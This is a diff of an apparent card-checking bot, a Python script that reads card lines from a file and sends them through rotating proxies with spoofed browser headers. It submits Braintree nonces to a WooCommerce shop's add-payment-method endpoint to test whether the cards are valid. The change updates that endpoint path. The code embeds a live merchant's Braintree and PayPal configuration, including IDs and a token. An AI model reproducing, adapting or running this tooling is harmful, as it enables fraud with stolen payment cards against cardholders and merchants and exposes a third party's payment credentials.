@@ -189,7 +189,7 @@ def get_new_auth():
     
     proxy = get_random_proxy()
     response = requests.get(
-        f'{domain_url}/my-account/add-payment-method/',
+        f'{domain_url}/account/add-payment-method-custom',
         cookies=cookies_1,
         headers=headers,
         proxies=proxy,
@@ -635,13 +635,13 @@ def check_card(cc_line):
             'braintree_cc_nonce_key': token,
             'braintree_cc_device_data': '{"correlation_id":"cc600ecf-f0e1-4316-ac29-7ad78aea"}',
             'woocommerce-add-payment-method-nonce': add_nonce,
-            '_wp_http_referer': '/my-account/add-payment-method/',
+            '_wp_http_referer': '/account/add-payment-method-custom',
             'woocommerce_add_payment_method': '1',
         }
 
         try:
             response = requests.post(
-                f'{domain_url}/my-account/add-payment-method/',
+                f'{domain_url}/account/add-payment-method-custom',
                 cookies=cookies_2,
                 headers=headers,
                 data=data,
@@ -800,7 +800,7 @@ for P in file.readlines():
                         'dnt': '1',
                         'origin': domain_url,
                         'priority': 'u=0, i',
-                        'referer': f'{domain_url}/my-account/add-payment-method/',
+                        'referer': f'{domain_url}/account/add-payment-method-custom',
                         'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                         'sec-ch-ua-mobile': '?0',
                         'sec-ch-ua-platform': '"Windows"',
@@ -819,13 +819,13 @@ for P in file.readlines():
                         'braintree_cc_3ds_nonce_key': '',
                         'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/wcr3cvc237q7jz6b/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/wcr3cvc237q7jz6b"},"merchantId":"wcr3cvc237q7jz6b","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Discover","Maestro","UK Maestro","MasterCard","Visa","American Express"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIzYjg0OGU1NS1jY2EyLTRiZGUtODY3MS01OTJiODkzNjA1ZGUiLCJpYXQiOjE3NDk3MzMyMjcsImV4cCI6MTc0OTc0MDQyNywiaXNzIjoiNWQyZTYwYTFmYWI4ZDUxYzE4ZDdhNzdlIiwiT3JnVW5pdElkIjoiNWQyZTYwYTE2OTRlM2E0NDY0ZWRkN2NlIn0.jVz8RHEJRVCxCiXKnm0jv9uYuuEUEWopnrbi9A2ng_Y"},"paypalEnabled":true,"paypal":{"displayName":"Hakko","clientId":"AR5mQQV5vUNYSF9-TCEtSXM7mHHUfFc5hSihOKKmEyMzg9z0FNLzrfdVyTK-X_06XQ4ZCCbFww-R91jp","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"hakkoGBP","payeeEmail":null,"currencyIsoCode":"GBP"}}',
                         'woocommerce-add-payment-method-nonce': add_nonce,
-                        '_wp_http_referer': '/my-account/add-payment-method/',
+                        '_wp_http_referer': '/account/add-payment-method-custom',
                         'woocommerce_add_payment_method': '1',
                     }
 
                     proxy = get_random_proxy()
                     response = requests.post(
-                        f'{domain_url}/my-account/add-payment-method/',
+                        f'{domain_url}/account/add-payment-method-custom',
                          cookies=cookies_2,
                         headers=headers,
                         data=data,
@@ -906,3 +906,4 @@ Bot By: 『@mhitzxg 帝 @pr0xy_xd』
 
 file.close()
 print("✅ Script finished!")
+
